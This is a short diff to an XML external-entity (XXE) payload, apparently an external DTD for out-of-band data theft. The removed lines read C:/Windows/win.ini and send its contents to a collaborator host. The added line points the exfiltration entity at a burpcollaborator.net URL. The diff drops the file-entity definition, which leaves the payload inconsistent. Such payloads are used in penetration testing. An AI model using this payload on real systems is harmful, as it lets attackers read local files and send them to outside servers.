@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % all "<!ENTITY &#25 exfil SYSTEM 'https://kpdprfdo0owbrt8w034gwjrg076zuo.cigitalcollaborator.com/?collect=%file;'>">
+<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://fsbtjr9jm5mbfdpl781z5yro0f67uw.burpcollaborator.net/?collect=%file;'>">
 %all;
-%exfil;
